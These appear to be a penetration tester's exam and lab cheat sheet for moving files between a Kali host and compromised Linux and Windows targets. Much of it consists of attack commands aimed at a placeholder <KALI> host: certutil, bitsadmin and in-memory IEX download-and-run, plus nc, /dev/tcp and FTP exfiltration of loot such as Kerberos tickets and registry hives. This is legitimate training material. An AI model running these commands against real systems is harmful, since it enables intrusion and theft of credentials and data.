# File transfer

## Serve from Kali
```bash
python3 -m http.server 8000
impacket-smbserver share /path/to/files -smb2support
```
- Check received size/checksum before executing.

## Pull to Linux
```bash
wget http://<KALI>:8000/file -O /tmp/file
curl http://<KALI>:8000/file -o /tmp/file
```
- `/dev/tcp` HTTP download includes response headers: strip them, then checksum.

## Pull to Windows
```powershell
certutil -urlcache -split -f http://<KALI>:8000/file.exe file.exe
Invoke-WebRequest http://<KALI>:8000/file.exe -OutFile file.exe
```

## Authenticated SMB share
When Windows refuses guest access to the share.

```bash
sudo impacket-smbserver share . -smb2support -username <USER> -password '<PW>'
```
```cmd
net view \\<KALI>
net use \\<KALI>\share /user:<USER> <PW>
copy C:\Temp\file.bin \\<KALI>\share\file.bin
```
- `<USER>`/`<PW>` here = any creds you pick for the Kali share.

## PowerShell paths containing brackets
```powershell
Copy-Item -LiteralPath 'C:\Temp\[ticket-id]-user@service.kirbi' `
  -Destination '\\<KALI>\share\ticket.kirbi' -ErrorAction Stop
Test-Path -LiteralPath '\\<KALI>\share\ticket.kirbi'
```
- Without `-LiteralPath`, `[` `]` are wildcard characters and the path won't match.

## Windows download variants
Pick one that the host allows; each writes to disk unless noted.

```cmd
curl.exe -o file.exe http://<KALI>:8000/file.exe
bitsadmin /transfer j /download /priority normal http://<KALI>:8000/file.exe C:\Temp\file.exe
copy \\<KALI>\share\file.exe C:\Temp\file.exe
```
```powershell
(New-Object Net.WebClient).DownloadFile('http://<KALI>:8000/file.exe','C:\Temp\file.exe')
Start-BitsTransfer -Source http://<KALI>:8000/file.exe -Destination C:\Temp\file.exe
iwr http://<KALI>:8000/file.exe -OutFile C:\Temp\file.exe
IEX (iwr http://<KALI>:8000/script.ps1 -UseBasicParsing)        # runs in memory, nothing on disk
```
- `iwr` without `-UseBasicParsing` fails on hosts without Internet Explorer's engine.
- Browser or SMB downloads carry the Mark-of-the-Web: `Unblock-File C:\Temp\file.ps1` before running a script.
- Writable locations that usually work: `C:\Temp`, `C:\Windows\Temp`, `C:\Users\Public`, `%USERPROFILE%\Downloads`.

## Linux without wget or curl
```bash
python3 -c 'import urllib.request as u; u.urlretrieve("http://<KALI>:8000/file","/tmp/file")'
perl -e 'use LWP::Simple; getstore("http://<KALI>:8000/file","/tmp/file")'
php -r 'file_put_contents("/tmp/file", file_get_contents("http://<KALI>:8000/file"));'
nc <KALI> 9001 > /tmp/file                    # Kali: nc -lvnp 9001 < file
scp <USER>@<KALI>:/path/file /tmp/file        # needs sshd on Kali
```
```bash
exec 3<>/dev/tcp/<KALI>/8000; printf 'GET /file HTTP/1.0\r\n\r\n' >&3; cat <&3 > /tmp/file
```
- Last line saves the HTTP headers too: remove them, then checksum.
- `chmod +x /tmp/file` before executing.

## Copy-paste when nothing can connect
Small files through a pasted shell (watch for line-length and `\r\n` issues):

```bash
base64 -w0 file; echo                    # Kali: copy the output
echo '<BASE64>' | base64 -d > /tmp/file  # Linux target
```
```cmd
certutil -decode file.b64 file.exe
```
```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Temp\file.bin'))
[IO.File]::WriteAllBytes('C:\Temp\file.exe',[Convert]::FromBase64String('<BASE64>'))
```
- Check the checksum on both sides; wrapped or truncated pastes corrupt binaries silently.

## Target → Kali
Collect output, hives, tickets, notes. Windows to Kali over SMB is covered above (`copy ... \\<KALI>\share\`).

```bash
# Kali: upload receiver
pip install uploadserver
python3 -m uploadserver 8000
```
```bash
curl -F 'files=@/path/file' http://<KALI>:8000/upload       # Linux target
```
```cmd
curl.exe -F "files=@C:\Temp\file.bin" http://<KALI>:8000/upload
```
```bash
nc -lvnp 9001 > loot.bin                    # Kali
nc <KALI> 9001 < /path/file                 # target
cat /path/file > /dev/tcp/<KALI>/9001       # target, bash only
scp /path/file <USER>@<KALI>:/tmp/          # needs sshd on Kali
```
```bash
# FTP receiver on Kali (anonymous write)
python3 -m pyftpdlib -p 21 -w
```
```cmd
echo open <KALI> 21> ftp.txt & echo anonymous>> ftp.txt & echo x>> ftp.txt & echo binary>> ftp.txt & echo put C:\Temp\file.bin>> ftp.txt & echo bye>> ftp.txt
ftp -s:ftp.txt
```
- Large exfil is limited by the exam rules: only copy what the report needs ([exam checklist](../documentation/exam-checklist.md)).
- Kali's `uploadserver` listens on all interfaces: run it only on the lab VPN interface, stop it when done.

## Check integrity
```bash
sha256sum file
```
```powershell
Get-FileHash C:\Temp\file.exe -Algorithm SHA256
certutil -hashfile C:\Temp\file.exe SHA256
```
